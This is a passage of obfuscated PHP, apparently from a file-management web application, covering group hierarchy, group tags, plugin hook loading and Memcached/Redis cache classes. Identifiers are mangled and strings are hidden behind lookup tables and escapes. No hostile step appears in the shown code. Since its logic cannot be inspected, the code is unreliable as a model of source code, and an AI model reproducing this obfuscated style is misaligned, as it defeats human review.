(!$ÌÅ®¹÷û) { return !0; } $Á™²ê« = $this->parentLevelArray($ÌÅ®¹÷û[$Èãİ³˜…[521]]); $Á™²ê«[] = $¤¸¬÷’¬; foreach ($Á™²ê« as $¤¸¬÷’¬) { if (in_array($¤¸¬÷’¬ . $Èãİ³˜…[12], $·Š™š‚Á)) { return !0; } } return !1; } private function _listAppendParent(&$—•ÂÍ ñ) { $ŒÄ¨  ½ =& $_SERVER[ßğøİ]; $š“ ­Áš = array(); foreach ($—•ÂÍ ñ as &$Şıış©) { $š“ ­Áš[$Şıış©[$ŒÄ¨  ½[1828]]] = $Şıış©[$ŒÄ¨  ½[32]]; $§¯”³åö = $this->parentLevelArray($Şıış©[$ŒÄ¨  ½[521]]); foreach ($§¯”³åö as $¿ĞÍ¸ ¾) { if (!isset($š“ ­Áš[$¿ĞÍ¸ ¾])) { $š“ ­Áš[$¿ĞÍ¸ ¾] = 0; } } } unset($Şıış©); foreach ($š“ ­Áš as $àû®ğäç => $ó™ï½Ş½) { if ($ó™ï½Ş½) { continue; } $Ö•”‡É— = $this->getInfoSimple($àû®ğäç); $š“ ­Áš[$àû®ğäç] = $Ö•”‡É—[$ŒÄ¨  ½[32]]; } $ş˜•Å = $GLOBALS[$ŒÄ¨  ½[6]][$ŒÄ¨  ½[89]][$ŒÄ¨  ½[1931]]; if ($GLOBALS[$ŒÄ¨  ½[503]] == $ŒÄ¨  ½[88]) { $ş˜•Å = !1; } foreach ($—•ÂÍ ñ as &$Şıış©) { $§¯”³åö = $this->parentLevelArray($Şıış©[$ŒÄ¨  ½[521]]); $Ø”¶š¹ = $ŒÄ¨  ½[12]; foreach ($§¯”³åö as $àû®ğäç => $¿ĞÍ¸ ¾) { if ($ş˜•Å && $àû®ğäç == 0) { continue; } $Ø”¶š¹ .= $š“ ­Áš[$¿ĞÍ¸ ¾] . $ŒÄ¨  ½[8]; } if ($§¯”³åö) { $Ø”¶š¹ .= $Şıış©[$ŒÄ¨  ½[32]]; } $Şıış©[$ŒÄ¨  ½[526]] = str_replace($ŒÄ¨  ½[529], $ŒÄ¨  ½[8], $Ø”¶š¹); } unset($Şıış©); } private function _listAppendSourceRoot(&$Ó­Ô‡‹À, $ƒóä‹Î) { $ÑÜ¥áÒ€ =& $_SERVER[ßğøİ]; $”¸·õÔ® = Model($ÑÜ¥áÒ€[822])->listSourceRoot(SourceModel::TYPE_GROUP, $ƒóä‹Î); $”¸·õÔ® = array_to_keyvalue($”¸·õÔ®, $ÑÜ¥áÒ€[505]); $”¸·õÔ® = array_remove_key($”¸·õÔ®, $ÑÜ¥áÒ€[505]); foreach ($Ó­Ô‡‹À as &$ßş‡ßÅ) { $ßş‡ßÅ[$ÑÜ¥áÒ€[86]] = $”¸·õÔ®[$ßş‡ßÅ[$ÑÜ¥áÒ€[1828]]] ? $”¸·õÔ®[$ßş‡ßÅ[$ÑÜ¥áÒ€[1828]]] : array(); } unset($ßş‡ßÅ); } protected function groupMerge($é…Åè·Ì) { $é…Åè·Ì = array_values(array_unique($é…Åè·Ì)); $úİşşñ€ = array(); for ($Ò–øŠª© = 0; $Ò–øŠª© < count($é…Åè·Ì); $Ò–øŠª©++) { $Ÿşš“±İ = !1; for ($®†¡“› = 0; $®†¡“› < count($é…Åè·Ì); $®†¡“›++) { if ($Ò–øŠª© == $®†¡“›) { continue; } if ($this->isParentOf($é…Åè·Ì[$®†¡“›], $é…Åè·Ì[$Ò–øŠª©])) { $Ÿşš“±İ = !0; break; } } if (!$Ÿşš“±İ) { $úİşşñ€[] = $é…Åè·Ì[$Ò–øŠª©]; } } return $úİşşñ€; } protected function isParentOf($á„€ñøù, $¡ÃâØ˜¼) { $¤¿í× =& $_SERVER[ßğøİ]; if (!$á„€ñøù || !$¡ÃâØ˜¼ || $á„€ñøù == $¡ÃâØ˜¼) { return !1; } $Ê­üÈ¬ = $this->getInfoSimple($á„€ñøù); $Æ’…ŠÖ = $this->getInfoSimple($¡ÃâØ˜¼); $ûñËëÊ³ = $Ê­üÈ¬[$¤¿í×[521]] . $á„€ñøù . $¤¿í×[50]; if (substr($Æ’…ŠÖ[$¤¿í×[521]], 0, strlen($ûñËëÊ³)) == $ûñËëÊ³) { return !0; } return !1; } public function groupShowRoot($üøŠŒâÉ, $¤¤ë¼¶  = false) { $Ö„ÚÔÖ´ =& $_SERVER[ßğøİ]; $–ëÅçÊ = $this->getInfo($üøŠŒâÉ); if (!$–ëÅçÊ) { return array(); } $œ÷¡Â˜ = $this->parentLevelArray($–ëÅçÊ[$Ö„ÚÔÖ´[521]]); $“€ß¸½ = array($üøŠŒâÉ); if (count($œ÷¡Â˜) == 0) { return $“€ß¸½; } if ($¤¤ë¼¶  && count($œ÷¡Â˜) == 1) { return $“€ß¸½; } if (!$–ëÅçÊ[$Ö„ÚÔÖ´[466]] || !isset($–ëÅçÊ[$Ö„ÚÔÖ´[466]][$Ö„ÚÔÖ´[1914]]) || $–ëÅçÊ[$Ö„ÚÔÖ´[466]][$Ö„ÚÔÖ´[1914]] == $Ö„ÚÔÖ´[1883]) { return $this->groupShowRoot($œ÷¡Â˜[count($œ÷¡Â˜) - 1], $¤¤ë¼¶ ); } if ($–ëÅçÊ[$Ö„ÚÔÖ´[466]][$Ö„ÚÔÖ´[1914]] == $Ö„ÚÔÖ´[357]) { $æ¾ë×‚È = explode($Ö„ÚÔÖ´[50], $–ëÅçÊ[$Ö„ÚÔÖ´[466]][$Ö„ÚÔÖ´[1915]]); if ($æ¾ë×‚È) { $“€ß¸½ = array_merge($“€ß¸½, $æ¾ë×‚È); } } return $“€ß¸½; } protected function resetParentLevel() { $Şø‡ß¡ =& $_SERVER[ßğøİ]; $¶§ŠÍÃ— = $Şø‡ß¡[1828]; $úÃğ§ô† = $this->select(); $úÃğ§ô† = array_to_keyvalue($úÃğ§ô†, $¶§ŠÍÃ—); foreach ($úÃğ§ô† as $î‡ÇÚóä) { $æ–ÆÒõË = $î‡ÇÚóä; $ĞŞ‚‹ = array(); while ($æ–ÆÒõË[$Şø‡ß¡[432]] != 0) { $ĞŞ‚‹[] = $æ–ÆÒõË[$Şø‡ß¡[432]]; $æ–ÆÒõË = $úÃğ§ô†[$æ–ÆÒõË[$Şø‡ß¡[432]]]; } $ĞŞ‚‹[] = 0; $ĞŞ‚‹ = $Şø‡ß¡[50] . implode($Şø‡ß¡[50], array_reverse($ĞŞ‚‹)) . $Şø‡ß¡[50]; $this->setNamePinyin($î‡ÇÚóä[$¶§ŠÍÃ—], $î‡ÇÚóä[$Şø‡ß¡[32]]); $this->where(array($¶§ŠÍÃ— => $î‡ÇÚóä[$¶§ŠÍÃ—]))->save(array($Şø‡ß¡[590] => $ĞŞ‚‹)); } return $úÃğ§ô†; } public function groupNameAuto($š×‘©©š, $Ï´îßÚñ) { $ƒ…ÜĞë» =& $_SERVER[ßğøİ]; $ÀÖ¨Áã‡ = $this->where(array($ƒ…ÜĞë»[401] => $š×‘©©š))->getField($ƒ…ÜĞë»[32], !0); if (!$ÀÖ¨Áã‡ || !in_array($Ï´îßÚñ, $ÀÖ¨Áã‡)) { return $Ï´îßÚñ; } for ($ğô¾Üò£ = 1; $ğô¾Üò£ <= count($ÀÖ¨Áã‡) + 1; $ğô¾Üò£++) { $ÖµÈÛÔ¸ = $Ï´îßÚñ . "\x28{$ğô¾Üò£}\51"; if (!in_array($ÖµÈÛÔ¸, $ÀÖ¨Áã‡)) { return $ÖµÈÛÔ¸; } } } public function groupSwitch($óò§í‹Ï, $«‹Ùóµñ) { $¾¸ıŠşĞ =& $_SERVER[ßğøİ]; $›Øâ¶¢ = array($¾¸ıŠşĞ[1828] => array($¾¸ıŠşĞ[7], array($óò§í‹Ï, $«‹Ùóµñ))); $Úä–Ñ³ = $this->where($›Øâ¶¢)->select(); $Úä–Ñ³ = array_to_keyvalue($Úä–Ñ³, $¾¸ıŠşĞ[1828]); if (!isset($Úä–Ñ³[$óò§í‹Ï]) || !isset($Úä–Ñ³[$«‹Ùóµñ]) || $Úä–Ñ³[$óò§í‹Ï][$¾¸ıŠşĞ[432]] == 0) { return !1; } $›Øâ¶¢ = array($¾¸ıŠşĞ[1828] => $óò§í‹Ï); $šÙ…ö¹ = Model($¾¸ıŠşĞ[1918])->where($›Øâ¶¢)->select(); if (!$šÙ…ö¹) { $šÙ…ö¹ = array(); } foreach ($šÙ…ö¹ as $øÒ¬Çì) { $ãÈŸõ = $øÒ¬Çì[$¾¸ıŠşĞ[1655]]; $›Øâ¶¢ = array($¾¸ıŠşĞ[1655] => $ãÈŸõ, $¾¸ıŠşĞ[1828] => $«‹Ùóµñ); $Üı‰Ëƒ» = Model($¾¸ıŠşĞ[1918])->where($›Øâ¶¢)->find(); if (!$Üı‰Ëƒ») { $âˆû®ä = array($«‹Ùóµñ => $øÒ¬Çì[$¾¸ıŠşĞ[1932]]); Model($¾¸ıŠşĞ[535])->userGroupAdd($ãÈŸõ, $âˆû®ä); } Model($¾¸ıŠşĞ[535])->userGroupRemove($ãÈŸõ, $óò§í‹Ï); } $›Øâ¶¢ = array($¾¸ıŠşĞ[411] => 2, $¾¸ıŠşĞ[432] => 0, $¾¸ıŠşĞ[410] => 1, $¾¸ıŠşĞ[505] => array($¾¸ıŠşĞ[7], array($óò§í‹Ï, $«‹Ùóµñ))); $ìÑ­²äÂ = Model($¾¸ıŠşĞ[822])->where($›Øâ¶¢)->field($¾¸ıŠşĞ[1933])->select(); $ìÑ­²äÂ = array_to_keyvalue($ìÑ­²äÂ, $¾¸ıŠşĞ[505], $¾¸ıŠşĞ[402]); $Õü®ô¾ş = !empty($ìÑ­²äÂ[$óò§í‹Ï]) ? $ìÑ­²äÂ[$óò§í‹Ï] : !1; if ($Õü®ô¾ş) { if (!$ìÑ­²äÂ[$«‹Ùóµñ]) { $ìÑ­²äÂ[$«‹Ùóµñ] = Model($¾¸ıŠşĞ[822])->groupRootAdd($«‹Ùóµñ); } $éı½Õ’ = $ìÑ­²äÂ[$«‹Ùóµñ]; $›Øâ¶¢ = array($¾¸ıŠşĞ[432] => $Õü®ô¾ş); $ìÑ­²äÂ = Model($¾¸ıŠşĞ[822])->where($›Øâ¶¢)->field($¾¸ıŠşĞ[1934])->select(); if (!$ìÑ­²äÂ) { $ìÑ­²äÂ = array(); } Model($¾¸ıŠşĞ[822])->moveClearAuth = !1; foreach ($ìÑ­²äÂ as $øéƒÍ­) { $ŸµÕÒƒû = $øéƒÍ­[$¾¸ıŠşĞ[410]] == $¾¸ıŠşĞ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¾¸ıŠşĞ[822])->move($øéƒÍ­[$¾¸ıŠşĞ[402]], $éı½Õ’, $ŸµÕÒƒû); } Model($¾¸ıŠşĞ[822])->moveClearAuth = !0; $›Øâ¶¢ = array($¾¸ıŠşĞ[411] => 2, $¾¸ıŠşĞ[505] => $óò§í‹Ï); $Ü¶‹¦ø½ = array($¾¸ıŠşĞ[505] => $«‹Ùóµñ); Model($¾¸ıŠşĞ[1935])->where($›Øâ¶¢)->save($Ü¶‹¦ø½); Model($¾¸ıŠşĞ[1936])->where($›Øâ¶¢)->save($Ü¶‹¦ø½); } $this->_changeChildLevel($Úä–Ñ³[$óò§í‹Ï], $Úä–Ñ³[$«‹Ùóµñ], !0); $this->where(array($¾¸ıŠşĞ[432] => $óò§í‹Ï))->save(array($¾¸ıŠşĞ[432] => $«‹Ùóµñ)); $this->_clearChildrenCache($Úä–Ñ³[$«‹Ùóµñ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($ÃËÚëÔ¯) { $–Î¯óœä =& $_SERVER[ßğøİ]; return array($–Î¯óœä[1937] => array($ÃËÚëÔ¯[0], $–Î¯óœä[1938]), $–Î¯óœä[1939] => array($ÃËÚëÔ¯[0], $–Î¯óœä[1940])); } protected function get($çÊ‘ûõŞ) { $Ê‹ŞŒ“„ =& $_SERVER[ßğøİ]; $ÆĞùƒ¿„ = Model($Ê‹ŞŒ“„[522])->metaGet($çÊ‘ûõŞ, $Ê‹ŞŒ“„[1941]); $´¥‹úôñ = json_decode($ÆĞùƒ¿„, !0); return $´¥‹úôñ ? $´¥‹úôñ : array($Ê‹ŞŒ“„[1942] => $Ê‹ŞŒ“„[88], $Ê‹ŞŒ“„[369] => array()); } protected function set($ÖÀÎ¦¼, $ë’áÈé“) { $Şª»îºÆ =& $_SERVER[ßğøİ]; $ë’áÈé“ = $ë’áÈé“ ? $ë’áÈé“ : array($Şª»îºÆ[1942] => $Şª»îºÆ[88], $Şª»îºÆ[369] => array()); return Model($Şª»îºÆ[522])->metaSet($ÖÀÎ¦¼, $Şª»îºÆ[1941], json_encode($ë’áÈé“)); } protected function getByTagID($§ë­¹°Œ, $ã˜¨ñ«º) { $»ô«öäğ =& $_SERVER[ßğøİ]; if (!$§ë­¹°Œ || !$ã˜¨ñ«º) { return !1; } if (!Model($»ô«öäğ[522])->getInfoSimple($§ë­¹°Œ)) { return !1; } $ĞîƒĞæ = $this->get($§ë­¹°Œ); if (!$ĞîƒĞæ || !isset($ĞîƒĞæ[$»ô«öäğ[369]])) { return !1; } $¾‰ŠåÙé = array_find_by_field($ĞîƒĞæ[$»ô«öäğ[369]], $»ô«öäğ[399], $ã˜¨ñ«º); return is_array($¾‰ŠåÙé) ? $¾‰ŠåÙé : !1; } public function listSource($í°½¯û›, $è¾€©Ó) { $“¬§Ûè =& $_SERVER[ßğøİ]; if ($è¾€©Ó && !is_array($è¾€©Ó)) { $è¾€©Ó = array($è¾€©Ó); } $Ù×ò¯Üû = $this->listData($í°½¯û›); $‹üÁı¨± = array(); foreach ($Ù×ò¯Üû as $‡ÂÅ•Ñ) { $˜Ûî÷•á = $‡ÂÅ•Ñ[$“¬§Ûè[84]]; if (!$˜Ûî÷•á) { continue; } if (!isset($‹üÁı¨±[$˜Ûî÷•á])) { $‹üÁı¨±[$˜Ûî÷•á] = array(); } $‹üÁı¨±[$˜Ûî÷•á][] = $‡ÂÅ•Ñ[$“¬§Ûè[426]]; } $ßñÀÁ¶• = array(); foreach ($‹üÁı¨± as $­•ùØü“ => $ô¾ì†) { $®ò³Ùüª = !0; if (!$è¾€©Ó) { $ßñÀÁ¶•[] = $­•ùØü“; continue; } foreach ($è¾€©Ó as $úéã„—Š) { if (!in_array($úéã„—Š, $ô¾ì†)) { $®ò³Ùüª = !1; break; } } if ($®ò³Ùüª) { $ßñÀÁ¶•[] = $­•ùØü“; } } if (!$ßñÀÁ¶•) { return array(); } $“éº±Ô = array($“¬§Ûè[417] => array($“¬§Ûè[418], $ßñÀÁ¶•), $“¬§Ûè[505] => $í°½¯û›, $“¬§Ûè[411] => SourceModel::TYPE_GROUP); $„üÈºÉ’ = Model($“¬§Ûè[1327])->listSource($“éº±Ô); if (!$„üÈºÉ’ || count($ßñÀÁ¶•) == $„üÈºÉ’[$“¬§Ûè[366]][$“¬§Ûè[367]]) { return $„üÈºÉ’; } $Ò²±ë‹û = array(); $†ñ·ÍûÄ = array_to_keyvalue($„üÈºÉ’[$“¬§Ûè[82]], $“¬§Ûè[12], $“¬§Ûè[402]); $Ü’«º• = array_to_keyvalue($„üÈºÉ’[$“¬§Ûè[83]], $“¬§Ûè[12], $“¬§Ûè[402]); $¬–«óÆê = array_merge($Ü’«º•, $†ñ·ÍûÄ); foreach ($ßñÀÁ¶• as $˜Ûî÷•á) { if (!in_array($˜Ûî÷•á, $¬–«óÆê)) { $Ò²±ë‹û[] = $˜Ûî÷•á; } } if ($Ò²±ë‹û) { $this->removeBySource($í°½¯û›, $Ò²±ë‹û); } return $„üÈºÉ’; } protected function listData($ìİ±ùºØ) { $Ôƒş½ì =& $_SERVER[ßğøİ]; $‚˜öº§ = array($Ôƒş½ì[1646] => 0, $Ôƒş½ì[484] => array($Ôƒş½ì[1943], 0), $Ôƒş½ì[422] => $Ôƒş½ì[1944] . $ìİ±ùºØ); $ßíçóı­ = $Ôƒş½ì[1945]; $ƒêÖµ¿Ô = $this->field($ßíçóı­)->where($‚˜öº§)->order($Ôƒş½ì[1946])->select(); return $ƒêÖµ¿Ô ? $ƒêÖµ¿Ô : array(); } protected function addToTag($Ó—«æÓ, $êĞÎÃîÇ, $Å¦ØÈãÇ) { $Š©÷Ğ€³ =& $_SERVER[ßğøİ]; if (!$this->getByTagID($Ó—«æÓ, $Å¦ØÈãÇ) || !$êĞÎÃîÇ) { return !1; } if (!Model($Š©÷Ğ€³[822])->pathInfo($êĞÎÃîÇ)) { return !1; } $Á›Úã¡ = array($Š©÷Ğ€³[1646] => 0, $Š©÷Ğ€³[484] => $Å¦ØÈãÇ, $Š©÷Ğ€³[421] => $êĞÎÃîÇ, $Š©÷Ğ€³[422] => $Š©÷Ğ€³[1947] . $Ó—«æÓ, $Š©÷Ğ€³[420] => $Š©÷Ğ€³[12], $Š©÷Ğ€³[1832] => 0); if ($this->where($Á›Úã¡)->find()) { return !1; } return $this->add($Á›Úã¡); } protected function removeFromTag($š¢‘ŠÈş, $ÃúğµÁå, $‰ÖÏ„€) { $˜âñÊÜè =& $_SERVER[ßğøİ]; if (!$this->getByTagID($š¢‘ŠÈş, $‰ÖÏ„€) || !$ÃúğµÁå) { return !1; } if (is_array($ÃúğµÁå)) { $ÃúğµÁå = array($˜âñÊÜè[7], $ÃúğµÁå); } $½ ²ÉÆÌ = array($˜âñÊÜè[1646] => 0, $˜âñÊÜè[484] => $‰ÖÏ„€, $˜âñÊÜè[422] => $˜âñÊÜè[1947] . $š¢‘ŠÈş, $˜âñÊÜè[421] => $ÃúğµÁå); return $this->where($½ ²ÉÆÌ)->delete(); } protected function removeByTag($š‰‰œŠ, $…Å°áİ°) { $·âàƒÇ =& $_SERVER[ßğøİ]; if (!$this->getByTagID($š‰‰œŠ, $…Å°áİ°)) { return !1; } $Úì–¾÷º = array($·âàƒÇ[1646] => 0, $·âàƒÇ[484] => $…Å°áİ°, $·âàƒÇ[422] => $·âàƒÇ[1947] . $š‰‰œŠ); return $this->where($Úì–¾÷º)->delete(); } protected function removeBySource($ºÑŒ¾±Ø, $ß¨ô¶¤ƒ) { $¿€ô²™¤ =& $_SERVER[ßğøİ]; if (!$ºÑŒ¾±Ø || !$ß¨ô¶¤ƒ) { return !1; } if (is_array($ß¨ô¶¤ƒ)) { $ß¨ô¶¤ƒ = array($¿€ô²™¤[7], $ß¨ô¶¤ƒ); } $½â—ç = array($¿€ô²™¤[1646] => 0, $¿€ô²™¤[421] => $ß¨ô¶¤ƒ, $¿€ô²™¤[484] => array($¿€ô²™¤[1014], 0), $¿€ô²™¤[422] => $¿€ô²™¤[1947] . $ºÑŒ¾±Ø); return $this->where($½â—ç)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x70\x6c\x75\147\x69\x6e\114\x69\163\x74"; public $field = array("\156\141\155\145", "\x73\164\141\x74\x75\x73", "\x72\x65\147\151\145\163\164", "\143\157\156\146\151\147"); public function loadList($úÁµíéñ = false) { $åÌªéÎŞ = array_to_keyvalue($this->listData(), $_SERVER[ßğøİ][32]); if ($úÁµíéñ) { return $åÌªéÎŞ[$úÁµíéñ]; } return $åÌªéÎŞ; } public function init() { $˜•à†È… =& $_SERVER[ßğøİ]; Hook::trigger($˜•à†È…[1948]); $ŠÌ“úËì = $this->loadPluginList(); foreach ($ŠÌ“úËì as $ÈŸêôÍÃ => $ıØ´ÒÜ¦) { $Ş¤¸È‘Ü = $this->appAllow($ÈŸêôÍÃ, $ıØ´ÒÜ¦); if (!$Ş¤¸È‘Ü) { continue; } foreach ($ıØ´ÒÜ¦[$˜•à†È…[1949]] as $–Ş…û¿ => $ˆË†İöÚ) { Hook::bind($–Ş…û¿, $ˆË†İöÚ); } } Hook::trigger($˜•à†È…[1950]); Hook::trigger(ACTION); } public function appAllow($ÕÎğ´ñ†, $ßƒÍÉ×Š, $ğ´è“„½ = true) { $ôÚÃ²×ƒ =& $_SERVER[ßğøİ]; $ŒÙºı™í = PLUGIN_DIR . $ÕÎğ´ñ† . $ôÚÃ²×ƒ[1951]; if (!is_array($ßƒÍÉ×Š) || !is_array($ßƒÍÉ×Š[$ôÚÃ²×ƒ[1949]]) || $ßƒÍÉ×Š[$ôÚÃ²×ƒ[747]] != 1 || !is_file($ŒÙºı™í)) { return !1; } if ($GLOBALS[$ôÚÃ²×ƒ[503]] == 1) { if ($GLOBALS[$ôÚÃ²×ƒ[6]][$ôÚÃ²×ƒ[1952]] || !$GLOBALS[$ôÚÃ²×ƒ[6]][$ôÚÃ²×ƒ[1953]]) { return !0; } $ÛêÎ“ – = explode($ôÚÃ²×ƒ[50], strtolower($GLOBALS[$ôÚÃ²×ƒ[6]][$ôÚÃ²×ƒ[1953]])); return in_array(strtolower($ÕÎğ´ñ†), $ÛêÎ“ –) ? !1 : !0; } if ($ğ´è“„½ && !Action($ôÚÃ²×ƒ[1954])->checkAuth($ÕÎğ´ñ†)) { return !1; } return !0; } public function unInstall($ÁßÖÓë) { $­ˆ – =& $_SERVER[ßğøİ]; $Ï“¦­ = $this->loadList($ÁßÖÓë); if (file_exists(PLUGIN_DIR . $ÁßÖÓë)) { Hook::apply($ÁßÖÓë . $­ˆ –[1955]); } $this->remove($Ï“¦­[$­ˆ –[399]]); } public function changeStatus($ÃÔ™™…î, $”ôÇæÁë) { $•ÆáÀÁÈ =& $_SERVER[ßğøİ]; $Œœ ’Á = $this->loadList($ÃÔ™™…î); if ($”ôÇæÁë) { Hook::apply($ÃÔ™™…î . $•ÆáÀÁÈ[1956]); } $this->update($Œœ ’Á[$•ÆáÀÁÈ[399]], array($•ÆáÀÁÈ[1957] => $”ôÇæÁë)); } public function appRegist($æßÖ ˆ, $Å¼°×Ô¦) { $»÷Òäï =& $_SERVER[ßğøİ]; $àä¡æŸü = $this->loadList($æßÖ ˆ); if ($àä¡æŸü) { $this->update($àä¡æŸü[$»÷Òäï[399]], array($»÷Òäï[1949] => $Å¼°×Ô¦)); } else { $†—ûûë = array($»÷Òäï[32] => $æßÖ ˆ, $»÷Òäï[1949] => $Å¼°×Ô¦, $»÷Òäï[747] => 0, $»÷Òäï[6] => $this->getConfigDefault($æßÖ ˆ)); $this->insert($†—ûûë); } } public function getConfigDefault($÷óÛ®ø) { $ ·ß–Ûñ =& $_SERVER[ßğøİ]; $ÆªªäÈ = array(); $â›è»İ = $this->getPackageJson($÷óÛ®ø); if (!$â›è»İ && is_array($â›è»İ[$ ·ß–Ûñ[1958]])) { return $ÆªªäÈ; } foreach ($â›è»İ[$ ·ß–Ûñ[1958]] as $ÀîÕ¡ç => $Ù¶€öÀØ) { if (!isset($Ù¶€öÀØ[$ ·ß–Ûñ[374]]) || isset($ÆªªäÈ[$ÀîÕ¡ç])) { continue; } $ÆªªäÈ[$ÀîÕ¡ç] = $Ù¶€öÀØ[$ ·ß–Ûñ[374]]; } return $ÆªªäÈ; } public function getPackageJson($ûø¸¤¾·) { return Hook::apply($ûø¸¤¾· . $_SERVER[ßğøİ][1959]); } public function getConfig($›†ÌØÚß, $áîøúÚ‚ = false) { $îüÏì‘… =& $_SERVER[ßğøİ]; $Çü¾¹é¿ = array(); $ñà æÏÚ = $this->loadList($›†ÌØÚß); if ($ñà æÏÚ && is_array($ñà æÏÚ[$îüÏì‘…[6]])) { $Çü¾¹é¿ = $ñà æÏÚ[$îüÏì‘…[6]]; } if (!$Çü¾¹é¿ || $áîøúÚ‚) { $Çü¾¹é¿ = $this->getConfigDefault($›†ÌØÚß); } return $Çü¾¹é¿; } public function setConfig($¸¯‰Õ¡, $€Ù™Í‡µ = false) { $Â½†üè =& $_SERVER[ßğøİ]; $½—À…¢¢ = $this->loadList($¸¯‰Õ¡); if (!$½—À…¢¢) { return !1; } $êÉ³ó¯Ï = $½—À…¢¢[$Â½†üè[6]]; if ($€Ù™Í‡µ == !1) { $êÉ³ó¯Ï = array(); $€Ù™Í‡µ = $this->getConfigDefault($¸¯‰Õ¡); } foreach ($€Ù™Í‡µ as $˜ìØ©Ğ‹ => $‰÷ÅåŠô) { $êÉ³ó¯Ï[$˜ìØ©Ğ‹] = is_string($‰÷ÅåŠô) ? trim($‰÷ÅåŠô) : $‰÷ÅåŠô; } $this->update($½—À…¢¢[$Â½†üè[399]], array($Â½†üè[6] => $êÉ³ó¯Ï)); } public function viewList() { $İÏŒ¬ö =& $_SERVER[ßğøİ]; $ˆÒÃßö = $this->loadList(); $this->pluginScan($ˆÒÃßö); $ˆÒÃßö = $this->loadPluginList(); $­“ºŒ¨ = array(); foreach ($ˆÒÃßö as $—¢øš¬’ => $ù¾ü§ªœ) { unset($ù¾ü§ªœ[$İÏŒ¬ö[1949]], $ù¾ü§ªœ[$İÏŒ¬ö[6]]); $ æ¾‹’ = PLUGIN_DIR . $ù¾ü§ªœ[$İÏŒ¬ö[32]] . $İÏŒ¬ö[1951]; if (!is_file($ æ¾‹’)) { continue; } $ş›Òîå = Hook::apply($ù¾ü§ªœ[$İÏŒ¬ö[32]] . $İÏŒ¬ö[1959]); if (is_array($ş›Òîå)) { $­“ºŒ¨[$—¢øš¬’] = array_merge($ù¾ü§ªœ, $ş›Òîå); } } return $­“ºŒ¨; } private function loadPluginList() { $†ÕÆº¦« =& $_SERVER[ßğøİ]; $Ãäğá = $this->loadList(); if (strtolower(MOD) == $†ÕÆº¦«[1960]) { return $Ãäğá; } $ÒÇ¿ª³÷ = Hook::trigger($†ÕÆº¦«[1961], $Ãäğá); if ($Ãäğá && !$ÒÇ¿ª³÷) { die; } return $ÒÇ¿ª³÷ ? $ÒÇ¿ª³÷ : $Ãäğá; } private function pluginScan($®±×ŸÔä) { $‰ê¶±» =& $_SERVER[ßğøİ]; recursion_dir(PLUGIN_DIR, $…Îµİøæ, $Š±ÑœŒê, 0); foreach ($…Îµİøæ as $Ë€Ø¿€È) { $ä¾¥­¥Ü = get_path_this($Ë€Ø¿€È); if (isset($®±×ŸÔä[$ä¾¥­¥Ü]) || !file_exists($Ë€Ø¿€È . $‰ê¶±»[1962]) || !file_exists($Ë€Ø¿€È . $‰ê¶±»[1951])) { continue; } Hook::apply($ä¾¥­¥Ü . $‰ê¶±»[1956]); } } } goto bø¢¬ªì•Î; Aãé—ËÓËÎ: class CacheLockDatabase { public function lock($ó¹Â²¥®, $Îíˆ¶ºÃ = 0) { $©œæäÏÀ = Model($_SERVER[ßğøİ][826]); $°Îıè’ = microtime(!0) + $Îíˆ¶ºÃ; while (microtime(!0) < $°Îıè’) { $Ó½Š¾Á = $©œæäÏÀ->get($ó¹Â²¥®); if (!$Ó½Š¾Á || $Ó½Š¾Á < microtime(!0)) { $ŸÎşîßÙ = $©œæäÏÀ->set($ó¹Â²¥®, $°Îıè’); if ($ŸÎşîßÙ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ï ›­) { return Model($_SERVER[ßğøİ][826])->get($ï ›­); } public function unlock($§‹î¼ä) { Model($_SERVER[ßğøİ][826])->remove($§‹î¼ä); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($È÷›ä¯’, $¼œ¡½ÅÍ) { $¶ÓÃª¿ =& $_SERVER[ßğøİ]; if (!class_exists($¶ÓÃª¿[859])) { show_json($¶ÓÃª¿[860], !1); } $this->cacheTime = $¼œ¡½ÅÍ; $this->handle = new Memcached(); if (is_array($È÷›ä¯’[$¶ÓÃª¿[861]]) && count($È÷›ä¯’[$¶ÓÃª¿[861]]) >= 1) { foreach ($È÷›ä¯’[$¶ÓÃª¿[861]] as $€ïİ©š) { $×ñ ¬¨í = explode($¶ÓÃª¿[4], $€ïİ©š); $this->handle->addServer($×ñ ¬¨í[0], $×ñ ¬¨í[1]); } } else { $this->handle->addServer($È÷›ä¯’[$¶ÓÃª¿[181]], $È÷›ä¯’[$¶ÓÃª¿[182]]); } } public function set($üİ’ûç, $’õ·¸¨ï, $İ‡¿ï½ = false) { $İ‡¿ï½ = $İ‡¿ï½ ? $İ‡¿ï½ : $this->cacheTime; return $this->handle->set($üİ’ûç, $’õ·¸¨ï, $İ‡¿ï½); } public function get($å´Ë¾©ñ) { return $this->handle->get($å´Ë¾©ñ); } public function remove($ôŞ‚¡üì) { return $this->handle->delete($ôŞ‚¡üì); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ë‰‘Œş†, $óÚ¸Î³”) { $Ûßíı Í =& $_SERVER[ßğøİ]; if (!class_exists($Ûßíı Í[862])) { show_json($Ûßíı Í[863], !1); } $this->cacheTime = $óÚ¸Î³”; $ğôÌäÇš = isset($ë‰‘Œş†[$Ûßíı Í[864]]) ? $ë‰‘Œş†[$Ûßíı Í[864]] : 10; $áâêèñß = _get($ë‰‘Œş†, $Ûßíı Í[861]); if ($áâêèñß && is_array($áâêèñß)) { $this->initCluster($ë‰‘Œş†, $ğôÌäÇš); } else { $this->handle = $this->init($ë‰‘Œş†, $ğôÌäÇš); } } private function init($÷Çß‹—Œ, $­‹Æğı›) { $í¶âÆ€‘ =& $_SERVER[ßğøİ]; $Ñßé·ÔÑ = new Redis(); $¥”ø×Šµ = isset($÷Çß‹—Œ[$í¶âÆ€‘[865]]) ? $÷Çß‹—Œ[$í¶âÆ€‘[865]] : !1; if ($¥”ø×Šµ) { $Ñßé·ÔÑ->pconnect($÷Çß‹—Œ[$í¶âÆ€‘[181]], $÷Çß‹—Œ[$í¶âÆ€‘[182]], $­‹Æğı›); } else { $Ñßé·ÔÑ->connect($÷Çß‹—Œ[$í¶âÆ€‘[181]], $÷Çß‹—Œ[$í¶âÆ€‘[182]], $­‹Æğı›); } if (!empty($÷Çß‹—Œ[$í¶âÆ€‘[413]])) { 